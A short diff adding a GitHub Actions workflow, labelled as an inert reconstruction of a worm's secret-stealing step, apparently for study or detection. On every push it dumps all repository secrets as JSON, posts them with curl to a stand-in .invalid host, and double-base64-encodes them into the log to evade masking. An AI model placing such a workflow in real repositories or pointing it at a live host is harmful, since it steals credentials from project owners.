@@ -1,0 +1,10 @@
+# wormsign replay: inert reconstruction, not a sample. The exfiltration URL is replaced by a .invalid host.
+on: push
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -d "$CONTENTS" https://exfil.wormsign-replay.invalid/collect;
+          echo "$CONTENTS" | base64 -w 0 | base64 -w 0
+        env:
+          CONTENTS: ${{ toJSON(secrets) }}
